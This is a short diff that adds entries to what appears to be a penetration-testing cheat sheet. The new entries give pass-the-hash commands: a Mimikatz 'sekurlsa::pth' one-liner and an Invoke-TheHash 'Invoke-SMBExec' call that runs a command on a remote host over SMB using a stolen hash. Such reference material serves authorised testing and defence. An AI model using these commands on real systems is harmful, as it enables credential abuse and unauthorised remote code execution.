@@ -627,6 +627,19 @@ $ python psexec.py <username>@<IP address>
 C:\> runas /savecred /user:<username> cmd
 ```
 
+- Mimikatz Pass-The-Hash (PTH)
+
+```
+C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<RC4 hash> /domain:<domain> /run:cmd.exe" exit
+```
+
+- Invoke-TheHash (PTH)
+
+```
+PS C:\> Import-Module .\Invoke-TheHash.psd1
+PS C:\> Invoke-SMBExec -Target <IP address> -Domain <Domain Name> -Username <username> -Hash <hash> -Command "<command>" -Verbose
+```
+
 #5. - Privilege Escalation
 -----------------------------------------
 
